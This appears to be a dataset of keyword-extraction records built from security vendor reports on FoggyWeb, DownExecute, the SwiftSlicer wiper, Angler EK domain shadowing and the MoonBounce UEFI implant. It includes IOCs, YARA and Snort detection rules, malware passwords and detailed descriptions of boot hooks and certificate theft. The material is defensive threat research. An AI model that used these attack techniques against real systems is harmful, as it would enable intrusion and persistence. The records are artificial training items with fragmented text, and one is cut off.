persistent backdoor | Microsoft Security BlogThe field _certificateProtector stores an instance of the Data Protector class DkmDataProtector for Distributed Key Management (DKM). The DkmDataProtector class implements a method named Unprotect(), which ultimately calls the Unprotect() method of DKM/IDKM (screenshot from Microsoft.IdentityServer.dll).The DKM Unprotect() method inherits a method named Unprotect() from Microsoft.IdentityServer.Dkm.DKMBase (screenshot from Microsoft.IdentityServer.Dkm.dll).The Unprotect() method from Microsoft.IdentityServer.Dkm.DKMBase (shown above) provides the functionality to decrypt the encrypted certificate (a PKCS12 object) stored in the EncryptedPfx blob.Armed with the knowledge about the availability of the Unprotect() method accessible via the _certificateProtector field, the backdoor invokes the Unprotect() method to decrypt the encrypted certificate stored in the EncryptedPfx blob of the desired certificate type (either the AD FS token signing or encryption certificate).A variant of the technique described in this Appendix was publicly presented by Douglas Bienstock and Austin Baker at the TROOPERS conference in 2019 (I am AD FS and so can you: Attacking Active Directory Federated Services). However, the method used by FoggyWeb differs from the publicly presented method, in that FoggyWeb leverages the _state and _certificateProtector fields from the AdministrationServiceState class/object to facilitate access to the Data Protector class DkmDataProtector (used to gain access to and invoke the Unprotect() method).url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogIndicators of compromise (IOCs)Type Threat systems from attacks:Best Practices for securing AD FS and Web Application ProxyWe strongly recommend for organizations to harden and secure AD FS deployments through the following best practices:Ensure only Active Directory Admins and AD FS Admins have admin rights to the AD FS system. Reduce local Administrators’ group membership on all AD FS servers. Require all cloud admins to use multi-factor authentication (MFA). Ensure minimal administration capability via agents. Limit on-network access via host firewall. Ensure AD FS Admins use Admin Workstations to protect their credentials. Place AD FS server computer objects in a top-level OU that doesn’t also host other servers. Ensure that all GPOs that apply to AD FS servers apply only to them and not to any other servers. This limits potential privilege escalation through GPO modification. Ensure that the installed certificates are protected against theft. Don’t store these on a share on the network and set a calendar reminder to ensure they get renewed before expiring (expired certificate breaks federation auth). Additionally, we recommend protecting signing keys or certificates in a hardware security module (HSM) attached to AD FS. Set logging to the highest level and send the AD FS (and security) logs to a SIEM to correlate with AD authentication as well as Azure AD (or similar).url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogRemove unnecessary protocols and Windows features. Use a long (>25 characters) and complex password for the AD FS service account. We recommend using a Group Managed Service Account (gMSA) as the service account, as it removes the need for managing the service account password over time by managing it automatically. Update to the latest AD FS version for security and logging improvements (as always, test first). When federated with Azure AD follow the best practices for securing and monitoring the AD FS trust with Azure AD.DetectionsProtecting AD FS servers is key to mitigating NOBELIUM attacks. Detecting and blocking malware, attacker activity, and other malicious artifacts on AD FS servers can break critical steps in known NOBELIUM attack chains. Microsoft Defender Antivirus detects the new NOBELIUM components discussed in this blog as the following malware:Loader: Trojan:Win32/FoggyWeb.A!dha Backdoor: Trojan:MSIL/FoggyWeb.A!dhaMicrosoft 365 DefenderEndpoint detection and response (EDR) capabilities in Microsoft Defender for Endpoint detect malicious behavior related to this malware which is surfaced as alerts with the following titles:A suspicious DLL was loaded by the ADFS service Suspicious service launched Suspicious file droppedAzure AD Identity ProtectionThis kind of attack can also be detected in the cloud using Azure AD Identity Protection. It is recommended that you monitor the Azure AD Identity Protection Risk detections report for the “Token Issuer Anomaly” detection. This detection looks for anomalies in the SAML token presented to the Azureurl 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogAD tenant.Advanced hunting queriesMicrosoft Defender for EndpointTo locate related activity, run the following advanced hunting queries in Microsoft 365 Defender:DeviceImageLoadEvents | where FolderPath has @""C:\Windows\ADFS"" | where FileName has @""version.dll""Azure SentinelAzure Sentinel customers can use the following detection queries to look for this activity:Detection query: url Sentinel/tree/master/Detections/MultipleDataSources/Nobelium_FoggyWeb.yamlIndicator file: url Sentinel/tree/master/Sample%20Data/Feeds/FoggyWebIOC.csvurl ","{'phrases': ['NOBELIUM', 'access', 'an AD FS server', 'the loader', 'DLL search order', 'decrypts', 'the backdoor', 'the AD FS service', 'Set', 'HTTP listeners', 'URI patterns', 'commands', 'certificates', 'configuration database', 'assemblies', 'source code', 'APIs', 'attack', 'monitoring', 'the AD FS server'], 'target': 'NOBELIUM; access; an AD FS server; the loader; DLL search order; decrypts; the backdoor; the AD FS service; Set; HTTP listeners; URI patterns; commands; certificates; configuration database; assemblies; source code; APIs; attack; monitoring; the AD FS server.'}"
spear phishing; targets; the document; RAR; the attacker; the file; the DownExecute malware; a downloader; control; IP; commands; the C2 server; plugins; data; the malware; the victim machine; IP address; IP.,"["" 1. Spear phishing emails send self-extracting RAR files containing DownExecute malware and decoy documents. 2. DownExecute calls home to C2 servers to report new infections and await commands. 3. C2 servers provide links to download additional malware like PoisonIvy and XtremeRAT. 4. Second stage malware provides fuller remote access, exfiltration channels, etc. 5. Attackers use access to conduct reconnaissance on targets' systems and data. 6. Collected intelligence guides development of custom capabilities to meet objectives. ""]","Extract the keywords: Attacks against Israeli & Palestinian interests 27 April 2015 By Tom LancasterFollow @tlansec Executive Summary This short report details the techniques being used in a series of attacks mostly against Israel based organisations. The decoy documents and filenames used in the attacks suggest the intended targets include organisations with political interests or influence in Israel and Palestine. Although we are unable to link this campaign to any already documented in open source, it bears similarities to some described by others previously[1],[2]. The earliest samples in the campaign we have identified date back to the summer of 2014. The number of samples discovered and relatively small scale of infrastructure suggest the attackers have limited resources with which to conduct attacks. Introduction Our investigation begins by taking a look at the following file: published on malwr.com[3], this file was originally named ‘Israel Homeland Defense Directory 2015 _Secured_.exe’ and, once executed, the following decoy document was presented:The initial file in this case is a self extracting RAR file that contains three components, including a decoy document (in this case, the PDF shown above) and the malware.Further inspection of the malware extracted showed it wasn’t a family our analysts recognised. This, coupled with the nature of the decoy document used, led us to take a more in depth look at the malware, and associated infrastructure.We’d like to give special thanks to Eyal Sela of ClearSky Security for his collaborative efforts in this The most common way this malware packaged is via a self extracting RAR file; however the attackers also appear to have used a number of other solutions to drop their malware, including a Visual Basic based wrapper and an Auto IT based wrapper.In terms of how the malware is delivered, it’s most likely that it’s done via spearphishing. For example, there are also several occasions where the VirusTotal ‘ITW’ tab suggests that the original dropper was available to download on a 3rd party website. In the case of the sample discussed in the introduction we can see:Pomf.se is a relatively low profile file sharing/hosting website currently based in Sweden. The use ofPomf.se is a relatively low profile file sharing/hosting website currently based in Sweden. The use of low key file sharing sites appears to be a feature of the campaign as far as we can tell, with a few other similar sites being used in the same way.This, in conjunction with the nature of the related files we have discovered (all of them are directly executable files) means it is likely that the malware is primarily delivered via spear phishing attempts, rather than any other method. DownExecute – Brief Analysis In this analysis, we’ll go over the file with a SHA256 hash of (leaving debug paths in malware seems to be very fashionable at the moment…):All variants of the DownExecute’ malware we’ve identified come packaged in the following fashion:From the samples we have analysed so far, the decoy application included is never used by the binary, and is presumably included so that anyone taking a cursory look at the file will conclude it is in fact the real deal. Whilst the cURL[4] binary included is used for internet connectivity but it’s currently unclear why the attackers chose to use this method of adding connectivity to their file.Some of the binaries are also self signed:So what can this malware do? Not all that much – it’s just a downloader.Before execution, the malware makes a couple of checks to avoid analysis, including checking for the presence of a debugger using IsDebuggerPresent as well as checking for the presence of VirtualBox by looking for the device name \\.\VBoxMiniRdrDN:The malware also checks for the presence of several anti virus solutions, as well for any processes including the word ‘security’:The malware then proceeds to decrypt some basic configuration data, including the command & control domain, and information about the origin of the infection, tracked via ID:Meanwhile, the malware begins calling home, whilst also keeping a log of its actions in a plaintext file that is created in the same folder as where the binary was executed from.After successful compromise… It appears as though the clue for the main functionality of this malware is in its name (it downloads, and then executes) files, as it offers little else for the attacker. The DownExecute malware is used as a way for the attackers to gain an initial foothold on the victim machine. The basic information reported back by the malware would also certainly allow the attacker a way to triage infections to ensure they had reached their intended victim rather than a researcher.We don’t have great visibility into post compromise activity at this stage; however there are a number of other malware samples which communicate with the same infrastructure as the DownExecute samples. It’s not unreasonable to infer that if these are more fully featured backdoors, that they are likely the 2nd stage malware families used in conjunction with DownExecute. Specifically, we’ve observed the well  documented Xtreme RAT and Poison Ivy malware families in use with the same domain names as DownExecute. The Poison Ivy passwords observed for the group were ‘admin2014’ and ‘admin!@#$%”. Command & Control InfrastructureThe vast majority of infrastructure in terms of hostnames observed associated with these attacks have been dynamic DNS domains, primarily associated with no ip.com. This provider is popular with several Middle Eastern threat actors tracked by PwC’s intelligence team. In terms of the size of the infrastructure used in the campaign using the tools described, it’s also fairly small, as shown on our Maltego graph.The attackers have made an unusual choice with respect to the hosting providers used for the malicious infrastructure. Most of the domains at the time of writing, and indeed historically, have pointed to IP address space owned by Host Sailor, geo located in Belize. Many of the threat actors in the Middle East that we’re familiar with have extremely volatile IP hosting, owing to the fact that the infrastructure is likely to be hosted on their own networks. This remote hosting therefore somewhat bucks the trend of some ofto be hosted on their own networks. This remote hosting therefore somewhat bucks the trend of some of the other actors we see from the region. Inferred Targeting As we have mentioned in a number of our other reports[5], attackers often use C&C domains which contain phrases relevant to their targets so as to make them appear legitimate. With this in mind we performed some simple analysis on the domain names used in this campaign to identify legitimate organisations being impersonated. For a full list of C&Cs used, please see Appendix B.Domain nameLegitimate EntityDescriptionRotter2.sytes.netrotter.netIsraeli news outlethaartezenglish.strangled.nethaaretz.co.ilIsraeli news outletwallanews.sytes.netynet.sytes.netsafar.selfip.comdepka.sytes.netwalla.co.ilynet.co.ilSafarIsraeli news outletIsraeli news outletIslamic 2nd monthdebka.comIsraeli news outletAs shown, there appears to be a theme here, with a number of Israeli news organisations being used as C&C themes and hence probably being targeted. So do we believe this campaign is focused only at Israeli companies? Perhaps not entirely. Targeting Whilst there are a number of documents clearly aimed at Israeli nationals , using political and military themes, one of the lures[6] included an Arabic language decoy document pictured below:The document in question discusses an alleged leak of information relating to Abbas, leader of the Palestine Liberation Organization. Whilst this is a subject which is clearly of key interest to all parties in the region, the fact the attackers sent an Arabic language version of the story may indicate that the recipient was expected to be fluent in Arabic, and possibly therefore less likely to be Israeli, but rathersomeone from another adjacent region. Conclusion Whilst, in this case, we’re unable to attribute this set of activity to a specific group or entity in the Middle East, it does bear a significant resemblance to many attacks seen from the Middle East that have been previously documented. Specifically, the following aspects of this campaign remind us of existing write  ups on Middle Eastern campaigns:Consistent use of the dynamic DNS provider no ip.com and associated domains: it’s unclear why there is a preference for this, however in several ‘how to’ videos on Arabic language underground forums the video creators recommend using no ip.com as opposed to other dynamic DNS providers; Use of publically available malware: many groups operating in the Middle East use malware families (such as Poison Ivy/Xtreme RAT) which are publically available rather than developing their own binaries; Variety of targeting: the targeting seems entirely restricted to Middle Eastern issues and, whilst there appears to be a heavy focus on Israel in the decoy documents we’ve observed, there is the possibility that Palestinians have been targeted as well. This is consistent with the complex relationships between the different nations and political groups in the region; Password schema: In their August 2013 blog[7], FireEye noted that a group they refer to as MoleRats used Poison Ivy and Xtreme RAT, in conjunction with a password of “!@#GooD#@!” The keyboard walk used for the symbols “!@#” across the top of a keyboard is similar to the password observed in some of our Poison Ivy samples.The fact that the attackers chose to develop their own dropper may be indicative that their biggest problem when conducting network intrusions is getting their foot in the door – particularly as it seems as though they still prefer the more fully featured Poison Ivy and Xtreme RAT backdoors as 2nd stage malware families.When we pivoted and looked for the earliest examples of the DownExecute malware, the first samples we could find were compiled in June 2014. We have no reason to believe in this case that the threat actor has tampered with the compile time on any samples, as all other samples discovered were identified shortly after they were compiled. As such we believe the campaign using this downloader malware has been on going for approximately 12 months. rule DownExecute_Ameta:author = ""PwC Cyber Threat Operations :: @tlansec""date = ""2015 04""reference = ""url against israeli palestinia n interests.html""description = “Malware is often wrapped/protected, best to run on memory”strings:$winver1 = ""win 8.1""$winver2 = ""win Server 2012 R2""$winver3 = ""win Srv 2012""$winver4 = ""win srv 2008 R2""$winver5 = ""win srv 2008""$winver6 = ""win vsta""$winver7 = ""win srv 2003 R2""$winver8 = ""win hm srv""$winver9 = ""win Strg srv 2003""$winver10 = ""win srv 2003""$winver11 = ""win XP prof x64 edt""$winver12 = ""win XP""$winver13 = ""win 2000""$pdb1 = ""D:\\Acms\\2\\docs\\Visual Studio 2013\\Projects\\DownloadExcute\\DownloadExcute\\Release\\DownExecute.pdb""$pdb2 = ""d:\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\writer.h""$pdb3 = "":\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\internal/stack.h""$pdb4 = ""\\downloadexcute\\downexecute\\""$magic1 = ""<Win Get Version Info Name Error""$magic2 = ""P@$sw0rd$nd""$magic3 = ""$t@k0v2rF10w""$magic4 = ""|*|123xXx(Mutex)xXx321|*|6 21 2014 03:06PM"" wide$str1 = ""Download Excute"" ascii wide fullword$str2 = ""EncryptorFunctionPointer %d""$str3 = ""%s\\%s.lnk""$str4 = ""Mac:%s Cpu:%s HD:%s""$str5 = ""feed back responce of host""$str6 = ""GET Token at host""$str7 = ""dwn md5 err""condition:all of ($winver*) orany of ($pdb*) orany of ($magic*) or2 of ($str*)Network IDS alert http any any  > any any (msg:""  [PwC CTD]    Unclassified Middle Eastern Actor   DownExecute URI (/dw/gtk)""; flow:established,to_server; urilen:7; content:""/dw/gtk""; http_uri; depth:7; content:""GET"" ; http_method; content:!""User Agent:""; http_header; content:!""Referer:""; http_header;http_method; content:!""User Agent:""; http_header; content:!""Referer:""; http_header; WHITE,author @ipsosCustodes; sid:99999901; rev:2015200401;)alert http any any  > any any (msg:""  [PwC CTD]    Unclassified Middle Eastern Actor   DownExecute URI (/dw/setup)""; flow:established,to_server; urilen:>8; content:""/dw/setup""; http_uri; depth:9; classtype:trojan activity; metadata:tlp WHITE,author @ipsosCustodes; sid:99999902; rev:2015200401;)alert http any any  > any any (msg:""  [PwC CTD]    Unclassified Middle Eastern Actor   DownExecute Headers""; flow:established,to_server; urilen:>7; content:""Accept */*""; http_client_body; content:""Content Type: multipart/form data\; boundary=                        ""; http_header; content: ""ci_session=""; http_cookie; depth:11; content: ""POST""; http_method; content:!""Referer:""; http_header; classtype:trojan activity; metadata:tlp WHITE,author @ipsosCustodes; sid:99999903; rev:2015200401;)[1] url rgets.pdf[2] url research/2013/08/operation molerats middle east cyber attacks  using poison ivy.html ","{'phrases': ['RAR', 'files', 'DownExecute malware', 'documents', 'C2', 'Server', 'ID', 'poison', 'Xtreme', 'attackers', 'Use', 'data', 'intelligence'], 'target': 'RAR; files; DownExecute malware; documents; C2; Server; ID; poison; Xtreme; attackers; Use; data; intelligence.'}"
Sandworm; the attackers; the wiper; the victim; a Delete File; the Shadow Copy; recursively overwrites files; CSIDL_SYSTEM%drivers; CSIDL_SYSTEM%WindowsNTDS; other non-system drives; the drive; reboots; the computer.,"['1. On January 25, 2023, ESET researchers discovered a new cyberattack in Ukraine. 2. The attackers deployed a new wiper malware called SwiftSlicer. 3. SwiftSlicer was distributed using Active Directory Group Policy. 4. The wiper is written in the Go programming language. 5. ESET attributes this attack to the Sandworm threat actor group. 6. When executed, SwiftSlicer deletes shadow copies on the system. 7. It recursively overwrites files located in %CSIDL_SYSTEM%\\drivers. 8. It overwrites files in %CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS. 9. It overwrites files on other non-system drives. 10. For overwriting files, it uses a 4,096 byte block filled with random bytes. 11. After overwriting files, SwiftSlicer reboots the computer. 12. ESET provided an IOC hash and detection names for the malware. 13. The attack shows Sandworm has developed a new Go-based wiper for attacks against Ukraine. ']","Extract the keywords: ESET Research  ESETresearch#BREAKING On January 25th #ESETResearch discovered a new cyberattack in Ukraine. Attackers deployed a new wiper we named #SwiftSlicer using Active Directory Group Policy. The #SwiftSlicer wiper is written in Go programing language. We attribute this attack to #Sandworm. 1/32:12 PM · Jan 27, 2023 ·116KViews240Retweets13Quote Tweets441Likes· ESETresearch Jan 27ESET Research Replying to  ESETresearch Once executed it deletes shadow copies, recursively overwrites files located in %CSIDL_SYSTEM%\drivers, %CSIDL_SYSTEM_DRIVE%\Windows\NTDS and other non-system drives and then reboots computer. For overwriting it uses 4096 bytes length block filled with randomly generated byte 2/3113446,700ESET Research IoCs: ESETresearch Jan 27·7346E2E29FADDD63AE5C610C07ACAB46B2B1B176ESET Detection names:WinGo/KillFiles.C trojan 3/3111415,657 ","{'phrases': ['January', '2023', 'ESET', 'Research', 'a new cyberattack', 'Ukraine', 'Attackers', 'a new wiper', 'SwiftSlicer', 'Active Directory Group Policy', 'Go', 'language', 'this attack', 'Sandworm', 'shadow copies', 'files', '%CSIDL_SYSTEM%\\drivers', '%CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS', 'other non-system drives', '10', '11', '12', 'IOC', 'Detection names', '13'], 'target': 'January; 2023; ESET; Research; a new cyberattack; Ukraine; Attackers; a new wiper; SwiftSlicer; Active Directory Group Policy; Go; language; this attack; Sandworm; shadow copies; files; %CSIDL_SYSTEM%\\drivers; %CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS; other non-system drives; 10; 11; 12; IOC; Detection names; 13.'}"
the attacker; ad agencies; content; url; www.mikeholt[.]com; legitimate domain; SSL certificates; the domain; stolen credentials; the legitimate domain; the exploit kit; malicious code; servers; filtering; redirection.,[' 1. Compromise domain registration credentials to create shadowed subdomains. 2. Configure shadowed domains to filter traffic and redirect to Angler EK. 3. Send traffic from compromised ad agency to shadowed domains. 4. Shadowed domains filter out non-targeted traffic. 5. Targeted traffic is redirected through various checks and landing pages to Angler EK. 6. Angler EK uses exploits and checks to filter researchers and load malware like Bedep. '],"Extract the keywords: The shadow knows: Malvertising campaigns use domain shadowing to pull in Angler EKMost online ads are displayed as a result of a chain of trust, from the publishers to the malicious advertiser via ad agencies and/or ad networks. For “traffers” (that is, actors bringing trafﬁc to a malicious destination; for example, exploit kits) that rely  on malvertising, one of the goals is to gain access to a high-proﬁle ad network such as DoubleClick,  Bing Ads, AdTech or AppNexus. A reputable, high-proﬁle ad network provides traffers with access to  higher-quality trafﬁc, and the more reputable an ad network appears, the easier it is for traffers to reach  this target trafﬁc.  Uncovering domain shadowing In early November, one of those high-proﬁle ad agencies appeared in Proofpoint sensors as “referrer”  to Angler exploit kit. Further investigation by Proofpoint researchers determined that the creative in question (ad banners) was pointing to content from url and landing at www.mikeholt[.]com."".Figure 1 Creative served by the abused ad agency (click to enlarge)Figure 2 A fake online ad for an authentic Website, displayed using a shadowed domain of that Website A disparity in the SSL certiﬁcate used by both servers is the ﬁrst hint that something is suspicious about   this ad.Figure 3 Shadowed domain SSL certiﬁcate vs legitimate site owner's domain SSL certiﬁcate   Comparison of the SSL certiﬁcates for two domains is a clue that this could be a case of “domain  shadowing” [3]. Domain shadowing is a technique for generating malicious subdomains from a legitimate domain, typically using stolen registration credentials for the domain owner. With the stolen credentials, the threat actor can create a large number of fraudulent subdomains (for example, ads.mikeholt[.]com) below the legitimate domain mikeholt[.]com. (The domain owners for these examples were contacted as part of this investigation and alerted to the fact that their registration credentials have probably beencompromised.) The attacker can then conﬁgure servers on the fraudulent subdomain to perform ﬁltering   and redirection actions that pull in their preferred exploit kit. Multiple parallel campaigns Further investigation identiﬁed other campaigns employing other compromised domains and abused ad  agencies. For example: adv.mtcharlestonlodge[.]comFigure 4: Example of ad with stolen creative linking to malicious domainFigure 5: SSL certiﬁcate details for compromised domain  media.healthy-homemakers[.]compromo.loopnetworksllc[.]comAn exploit kit out of nowhere Researchers who have the opportunity to replay this attack in a controlled environment will not be able to see much without SSL man-in-the-middle capabilities (Fig 6); instead the attack will appear to be Angler EK materializing ‘out of thin air’.Figure 6: Trafﬁc captured on the 2015-11-21 without MITM capabilities  A look in the SSL tunnel One of the reasons that malvertising is appealing to threat actors is that the ad agency / network itself performs a signiﬁcant portion of the targeting, including geo, browser and other options. However, the  malicious ad server also includes ﬁltering settings, and as a result non-targeted clients (such as known IP address, wrong country) will receive harmless ad code.Figure 7: Harmless code served by the server if the client does not match the ﬁltering options or if the  campaign is on hold When a targeted client visits a site served by the infected content delivery network (CDN), the attack follows these steps:1. Send a post to ﬁlter proxied trafﬁc.   2. A global JavaScript reads the results of the ﬁltering;  3. If the reply is as expected, decode a bogus GIF (Fig. 8). 4. Check the system using two information disclosure bugs in Microsoft Internet Explorer to avoidresearchers, sandboxes and some security products.5. Abuse an HTTPS open redirect by DoubleClick. [2] 6. Land the browser on Angler EK without a referrer.Figure 8: Malicious code sent by the fake ad server, including fake GIF image ﬁle  Decoding the fake GIF produces a JavaScript function (Fig. 9).Figure 9: Encoded JavaScript function inside a ""GIF"" The decoded JavaScript function leverages two information disclosure bugs in Internet Explorer in order to ﬁltering potential victims. (Fig. 10) Figure 10: Decoded fake GIF showing redirect and additional ﬁltering  In order, these checks are:A variation of a technique used by Magnitude and Angler EKs and is used to ﬁlter the client by  certain security products. A MimeType check in order to ﬁlter certain shellex associations, including .py, .pcap and .saz  (Fig. 10).Both of these bugs were reported to Microsoft in May. All replay attempts of this threat revealed ﬁleless Angler EK [4] [5] threads loading Bedep in memory.  The Bedep in action is ""buildId"" 1926. Over the course of November, Proofpoint researchers have observed this Bedep version loading a variety of malware payloads including Fileless Ursnif [4], Ramnit, Blowcrypt, some Vawtrak campaigns 13 and 60 [7], and most recently Reactor Bot. Malvertising is by now a well-known attack vector and organizations, web sites, and ad networkoperators have adapted their defenses to detect and defend against it. As this example, shows, however, threat actors are also evolving their techniques, using more sophisticated attack chains that make it more difﬁcult for even diligent ad agencies and ad network operators to detect malvertising in  their ad streams. These adaptations will enable malvertising to remain an effective malware distribution method for months to come. [1] url [2] url [3] url [4] urlﬁleless.html  [5] urlﬁleless-exploit-delivery-2/  [6] urlﬁleless-ursnif-doing-some-pos.html  [7] url POS Reco “Fileless” Ursnif zwietrzyla1morinaga.eﬂoridacoupons[.]com  (NOTE: older rules would ﬁre on older trafﬁc)  Shadowed Vawtrak C&C Bedep Domain Ursnif C&C Angler EK Reactor Bot C&C2018558 || ET TROJAN Win32/Ramnit Checkin 2019678 || ET TROJAN Ursnif Checkin 2019400 || ET TROJAN Possible Bedep Connectivity Check 2021418 || ET TROJAN Bedep HTTP POST CnC Beacon 2022141 || ET CURRENT_EVENTS Angler encrypted payload Nov 23 2811284 || ETPRO CURRENT_EVENTS Angler or Nuclear EK Flash Exploit M2 2814948 || ETPRO CURRENT_EVENTS Possible EK Redir SSL Cert 2815003 || ETPRO CURRENT_EVENTS Angler EK Landing Nov 18 2015 2815071 || ETPRO CURRENT_EVENTS Possible Angler EK Payload Nov 23 2015 2814630 || ETPRO CURRENT_EVENTS Possible Angler EK IE DHE Post M2 2807957 || ETPRO TROJAN Win32/TrojanDownloader.Blocrypt Checkin 2814112 || ETPRO TROJAN Vawtrak HTTP CnC Beacon 2813060 || ETPRO TROJAN Vawtrak Retrieving Module Tuesday, December 15, 2015 - 11:15MalvertisingAngler EKDomain shadowingProofpoint StaffRelated LinksPress Releases > Proofpoint in the News > Proofpoint Blog > Threat Insights blog > Events > Media Contacts >ADD NEW COMMENTYour nameSubjectComment *Switch to plain text editorMore information about text formatsText format Filtered HTMLAllowed HTML tags: <em> <strong> <cite> <blockquote> <s> <sub> <sup> <i> <b> <li> <ul> <ol> <u> <a> <p> <br /> <img>BACK TO TOPSave PreviewPRODUCTS Targeted Attack Protection Social Media Security Malvertising Protection Privacy, DLP and Encryption TAP Mobile DefenseREGIONS United StatesUnited KingdomFranceGermanySpainJapanTaiwanAustraliaPARTNER LOG-INSENDMAIL SUPPORT LOG-INSUPPORT LOG-IN© 2015 PROOFPOINT, INC.PRIVACY POLICY ","{'phrases': ['Compromise', 'registration credentials', 'ad', 'domains', 'Figure', 'Angler EK', 'checks', 'researchers', 'Bedep'], 'target': 'Compromise; registration credentials; ad; domains; Figure; Angler EK; checks; researchers; Bedep.'}"
the attackers; the CORE_DXE; hooks; boot services; the DXE drivers; the hook function; AllocatePool; CreateEventEx; the EFI_BOOT_SERVICES table; hooks; the threads; rsi; rdi; the EFI_BOLDER; the loader; the boot process; the shellcode; the loader; a svchost.exe process; the driver; the shellcode; the user-mode malware; the user-mode malware; MD5SHA1D94962550B; MD5SHA2; EAXE; the malware; the Windows kernel; startup; the C2; commands; data; the loader; 10.,['1. Compromise system firmware and implant rogue UEFI module containing MoonBounce. 2. Rogue firmware hooks legitimate boot services functions like AllocatePool and ExitBootServices. 3. Hooks execute shellcode during boot that injects a kernel driver. 4. Driver injects malware stager into svchost.exe process. 5. Stager reaches out to C2 server to download next stage payload. 6. Payload executes in user mode persistence achieved across reboots. 7. MoonBounce cleans up traces and continues operating stealthily. '],"Extract the keywords: Technical details of MoonBounce’s implementationLearn more on kaspersky.com #bringonthefutureMoonBounce UEFI ImplantThe rogue CORE_DXE component was patched by the attackers to incorporate an additional, malicious payload, which represents what we refer to as the MoonBounce implant.MD5SHA1D94962550B90DDB3F80F62BD96BD98586BFB3634F6B6C5A114121FE53279331FF821EE1ESHA25674B75B1A1375BA58A51436C02EB94D5ADCD49F284744CF2015E03DA036C2CF1ALink timeFriday, 18.07.2014 03:29:55 UTCFile type64-Bit EFI_BOOT_SERVICES_DRIVERFile size1.698 MBFile nameCORE_DXEThis payload was appended to an unnamed section that follows the .reloc section and contains both shellcode and a malicious driver that are introduced in memory through a multistage infection chain during boot time. The driver, which is supposed to run in the context of the Windows kernel during its initialization phase, is in charge of deploying user-mode malware by injecting it into an svchost.exe process, once the operating system is up and running.The aforementioned infection chain starts with a set of inline hooks at the beginning of several functions in the EFI_BOOT_SERVICES structure. This structure, which is a part of the CORE_DXE image itself, contains a table of pointers to routines (referred to as Boot Services) that are callable by subsequent components in the boot sequence, such as the DXE drivers, boot loader and OS loader. Hooking functions in this table facilitates the propagation of malicious code to other boot components during system startup.The hooked functions in the underlying EFI_BOOT_SERVICES table, namely AllocatePool, CreateEventEx and ExitBootServices, have their first 5 bytes (typically referred to as the function’s prologue) replaced with a call instruction to a single malicious hook. The hook’s code checks the first bytes after the call instruction and, based on predefined byte patterns, can deduce the source function triggering its execution. Based on this trait, it can dispatch the flow to successive handlers corresponding to each of the hooked functions.Example of a hook installed at the beginning of the AllocatePool boot services1The steps taken in the infection chain, as a result of deploying the above hooks, are depicted in the following diagram with accompanying explanations:Flow of MoonBounce execution from boot sequence to malware deployment in user space1. The first Boot Services function invoked in CORE_DXE after the EFI_BOOT_SERVICES structure initialization isAllocatePool, which diverts execution to its corresponding handler within the hook function.22. AllocatePool’s handler:• Restores the original prologue bytes that were previously modified by the attackers to “48 89 5C 24 08” (corresponding to the instruction “mov [rsp+8], rbx”) and saves the state of the registers rcx,rdx,r8,r9,rsi and rdi (some of which are typically used to pass function arguments).• Calls AllocatePool (which is now unhooked) with pre-configured parameters that are intended to allocate a buffer in memoryand assign it with shellcode used at later stages of the infection.• Restores the saved state of the registers and passes control back to the beginning of AllocatePool, which is now executedwith the original arguments with which it was invoked in the first place.3. The next Boot Services function invoked in CORE_DXE is CreateEventEx that diverts execution to its handler within theAllocatePool’s hook logichook function.4. CreateEventEx’s handler:• Restores the original prologue bytes that were previously modified by the attackers to “48 8B C4 48 89” (corresponding to the instructions “mov rax” and “mov [rax+8], rbx”) and saves the state of the registers rcx,rdx,r8,r9,rsi and rdi (some of which are typically used to pass function arguments).• Calls the now unhooked CreateEventEx with predefined arguments to register a callback for an event that represents alegacy boot (designated with the GUID {2A571201-4966-47F6-8B86-F31E41F32F10}, i.e. gEfiEventLegacyBootGuid). In that case, the callback is responsible for passing control to the shellcode set up in AllocatePool’s hook.• Restores the saved state of the registers and passes control back to the beginning of CreateEventEx, which is now executedwith the original arguments with which it was invoked in the first place.3CreateEventEx’s hook logic5. The boot sequence continues, passing control to the Windows OS loader. At one point, this loader calls the hooked function ExitBootServices, which is supposed to hand control over to the OS loader and eliminate the dependency on the firmware- based Boot Services functions.6. Execution is diverted to the ExitBootServices handler within the hook previously set up in CORE_DXE.The hooking of ExitBootServices in particular was described as a technique in the Vault7 leaks.7. The ExitBootServices handler conducts the following actions:• Restores the original prologue bytes that were previously modified by the attackers to “48 89 5C 24 08” (corresponding to theinstruction “mov [rsp+8],rbx”).• Takes the previous return address from the stack (the first address after the call to ExitBootServices) and searches for the byte pattern “41 55 48 CB” (corresponding to the instructions “push r13” and “retfq”) within a region of 0x158878 bytes after it. These bytes designate the end of the function OslArchTransferToKernel in the Windows OS loader image (typically named winload.efi or osloader.exe and residing in the ESP partition on disk).• Copies 0x229 bytes of shellcode to address 0x98000 in memory. • Replaces the bytes starting with “48 CB” (retfq) at the end of the OslArchTransferToKernel function to E9 <offset_to_0x9800_shellcode>, which is essentially a jump to the shellcode that was just copied to 0x9800.• Restores the saved state of the registers and passes control back to the beginning of the now unhooked ExitBootServices,which is executed as it was originally intended in flow of the Windows OS loader.4ExitBootServices’ hook logic8. In the further execution flow of the Windows loader, it invokes the aforementioned OslArchTransferToKernel function, whichpasses control from the OS loader to the Windows kernel. As mentioned in step 7, the last bytes of the function are replaced, diverting execution to a formerly allocated shellcode that effectively serves as a hook for OslArchTransferToKernel.9. The OslArchTransgerToKernel hook:• Locates the image base of ntoskrnl.exe in memory. • Resolves function addresses exported by ntoskrnl.exe, through which it uses a name-hashing algorithm with the followingequivalent logic:def fn_name_hash(name): for ch in name: index += ord(ch) name_hash += index return (name_hash << 16) | indexThe compared function name hashes and their corresponding resolved functions are:• 0x42790710 – ExRegisterCallback • 0x2802057D – ExAllocatePool • 0x1C88047D – MmMapIoSpace• Changes the Characteristics field in each section header of ntoskrnl.exe’s image in memory:• The IMAGE_SCN_MEM_DISCARDABLE bit gets disabled (the section cannot be discarded); • The IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE and IMAGE_SCN_MEM_NOT_PAGED bits getenabled.• Copies 0xCC bytes of another shellcode to the virtual address of the 